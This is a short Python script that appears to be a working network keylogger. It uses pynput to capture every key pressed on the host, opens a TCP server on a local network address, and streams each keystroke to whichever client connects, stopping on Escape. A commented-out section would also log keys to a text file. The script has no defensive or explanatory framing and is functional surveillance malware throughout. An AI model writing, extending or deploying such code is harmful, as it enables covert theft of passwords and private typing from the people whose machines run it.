from pynput.keyboard import Listener
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("192.168.178.22", 1236))
s.listen()


def update_array(char):
    Safe.array.append(char)
    Safe.index += 1


class Safe:
    array = []
    index = 0


def key_press(key):
    string_key = str(key).replace("'", "")
    if "esc" in string_key:
        client_socket.close()
        return 0
    client_socket.send(bytes(string_key, "utf-8"))

    """with open(r"wsad.txt", "a")as f:
        try:
            f.write("{0}".format(key.char))
            update_array(string_key)
        except AttributeError:
            if "Key.space" in str(key):
                f.write(" ")
                update_array(" ")
            elif"key.enter" in str(key):
                f.write("\n")
                update_array("\n")
            elif"Key.backspace" in str(key):
                f.write("\nbackspace\n")
                del Safe.array[-1]
    print(Safe.array)"""


client_socket, address = s.accept()
print(f"Connection from {address} has been established")
with Listener(on_press=key_press)as l:
    l.join()
